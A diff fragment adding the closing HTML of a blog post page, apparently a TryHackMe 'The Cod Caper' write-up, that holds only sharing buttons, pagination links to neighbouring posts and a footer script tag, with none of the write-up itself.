+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f;title=TryHackme%20-%20The%20Cod%20Caper%20-%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=TryHackme%20-%20The%20Cod%20Caper%20-%20Write%20Up%20https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f&amp;t=TryHackme%20-%20The%20Cod%20Caper%20-%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=TryHackme%20-%20The%20Cod%20Caper%20-%20Write%20Up&amp;url=https%3a%2f%2fnmmorette.github.io%2fposts%2f2021%2f07%2ftryhackme-the-cod-caper-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h"></span>
+            <hr />
+        </div>
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://nmmorette.github.io/posts/2021/07/tryhackme-pre-security-path-review/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">TryHackme - Pre-Security Path - Review</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://nmmorette.github.io/posts/2021/06/static-web-page-with-hugo-and-git-hub/">
+                    <span class="button__text">Static web page with Hugo and Git Hub</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+
+
+
+    </body>
+</html>
